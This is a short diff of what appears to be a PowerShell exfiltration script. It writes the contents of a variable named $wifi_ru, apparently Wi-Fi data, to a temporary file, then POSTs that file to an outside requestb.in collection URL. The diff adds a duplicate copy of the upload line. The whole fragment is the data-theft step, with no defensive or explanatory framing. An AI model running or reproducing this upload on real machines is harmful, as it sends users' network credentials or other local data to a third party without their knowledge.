@@ -4,4 +4,5 @@ $url="https://requestb.in/zx2l4tzx"
 $wifi_ru | Out-File tmp.txt
 $data=Get-Content .\tmp.txt
 Invoke-RestMethod -Method Post -Uri $url -Body $data
+Invoke-RestMethod -Method Post -Uri $url -Body $data
 
